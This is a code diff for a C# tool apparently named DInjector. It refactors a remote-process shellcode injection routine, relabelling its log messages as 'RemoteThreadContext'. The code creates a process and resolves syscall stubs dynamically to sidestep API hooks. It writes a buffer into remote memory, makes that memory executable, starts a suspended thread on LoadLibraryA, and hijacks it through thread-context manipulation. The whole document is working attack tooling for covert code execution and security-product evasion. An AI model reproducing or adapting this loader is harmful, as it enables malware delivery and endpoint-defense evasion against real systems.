@@ -43,7 +43,7 @@ namespace DInjector
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
             uint NewProtect,
-            ref uint OldProtect);
+            out uint OldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
@@ -100,16 +100,16 @@ namespace DInjector
 
             if (result)
             {
-                Console.WriteLine("(Module) [+] CreateProcess");
+                Console.WriteLine("(RemoteThreadContext) [+] CreateProcess");
             }
             else
             {
-                Console.WriteLine("(Module) [-] CreateProcess");
+                Console.WriteLine("(RemoteThreadContext) [-] CreateProcess");
             }
 
             #endregion
 
-            #region NtAllocateVirtualMemory
+            #region NtAllocateVirtualMemory (PAGE_READWRITE)
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
@@ -129,11 +129,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
+                Console.WriteLine("(RemoteThreadContext) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadContext) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
             }
 
             #endregion
@@ -157,43 +157,41 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtWriteVirtualMemory");
+                Console.WriteLine("(RemoteThreadContext) [+] NtWriteVirtualMemory");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtWriteVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadContext) [-] NtWriteVirtualMemory: {ntstatus}");
             }
 
             Marshal.FreeHGlobal(buffer);
 
             #endregion
 
-            #region NtProtectVirtualMemory
+            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
-            uint oldProtect = 0;
 
             ntstatus = sysNtProtectVirtualMemory(
                 hProcess,
                 ref baseAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                ref oldProtect);
+                out uint _);
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
+                Console.WriteLine("(RemoteThreadContext) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadContext) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
             }
 
             #endregion
 
-            #region NtCreateThreadEx(LoadLibraryA)
+            #region NtCreateThreadEx (LoadLibraryA, CREATE_SUSPENDED)
 
             IntPtr pkernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
             IntPtr loadLibraryAddr = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "LoadLibraryA");
@@ -218,11 +216,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtCreateThreadEx");
+                Console.WriteLine("(RemoteThreadContext) [+] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtCreateThreadEx: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadContext) [-] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED: {ntstatus}");
             }
 
             #endregion
@@ -241,11 +239,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtGetContextThread");
+                Console.WriteLine("(RemoteThreadContext) [+] NtGetContextThread");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtGetContextThread: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadContext) [-] NtGetContextThread: {ntstatus}");
             }
 
             #endregion
@@ -263,11 +261,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtSetContextThread");
+                Console.WriteLine("(RemoteThreadContext) [+] NtSetContextThread");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtSetContextThread: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadContext) [-] NtSetContextThread: {ntstatus}");
             }
 
             #endregion
@@ -285,11 +283,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtResumeThread");
+                Console.WriteLine("(RemoteThreadContext) [+] NtResumeThread");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtResumeThread: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadContext) [-] NtResumeThread: {ntstatus}");
             }
 
             #endregion
